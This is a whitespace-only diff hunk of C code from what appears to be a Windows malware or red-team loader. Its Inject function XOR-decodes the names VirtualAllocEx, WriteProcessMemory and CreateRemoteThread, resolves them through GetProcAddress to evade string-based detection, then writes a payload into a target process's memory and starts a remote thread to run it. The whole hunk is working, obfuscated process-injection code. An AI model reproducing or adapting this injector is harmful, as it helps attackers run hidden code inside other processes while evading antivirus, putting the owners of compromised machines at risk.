@@ -72,26 +72,26 @@ void XOR(char * data, size_t data_len, char * key, size_t key_len) {
 }
 
 int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
-    LPVOID pRemoteCode = NULL;
-    HANDLE hThread = NULL;
+    	LPVOID pRemoteCode = NULL;
+    	HANDLE hThread = NULL;
 	unsigned char sVirtualAllocEx[]= { 0x3b, 0x1, 0x43, 0x10, 0x14, 0x15, 0x1, 0x29, 0x5d, 0x8, 0xe, 0x17, 0x28, 0x10 };      
 	unsigned char sWriteProcessMemory[]={ 0x3a, 0x1a, 0x58, 0x10, 0x4, 0x24, 0x1f, 0x7, 0x52, 0x1, 0x12, 0x7, 0x20, 0xd, 0x5c, 0xb, 0x13, 0xd };     
 	unsigned char sCreateRemoteThread[]={ 0x2e, 0x1a, 0x54, 0x5, 0x15, 0x11, 0x3f, 0xd, 0x5c, 0xb, 0x15, 0x11, 0x39, 0x0, 0x43, 0x1, 0x0, 0x10 };  
 	XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
 	XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
 	XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
-    //Function call obfuscation
+    	//Function call obfuscation
 	Address_VirtualAllocEx=GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualAllocEx);
 	Address_WriteProcessMemory=GetProcAddress(GetModuleHandle("kernel32.dll"),sWriteProcessMemory);
 	Address_CreateRemoteThread=GetProcAddress(GetModuleHandle("kernel32.dll"),sCreateRemoteThread);
-    pRemoteCode = Address_VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-    Address_WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
-    hThread = Address_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
-    if (hThread != NULL) {
-        WaitForSingleObject(hThread, 500);
-        CloseHandle(hThread);
-        return 0;
-    }
-    return -1;
+   	pRemoteCode = Address_VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    	Address_WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+    	hThread = Address_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+    	if (hThread != NULL) {
+        	WaitForSingleObject(hThread, 500);
+        	CloseHandle(hThread);
+        	return 0;
+    	}
+    	return -1;
 }
 
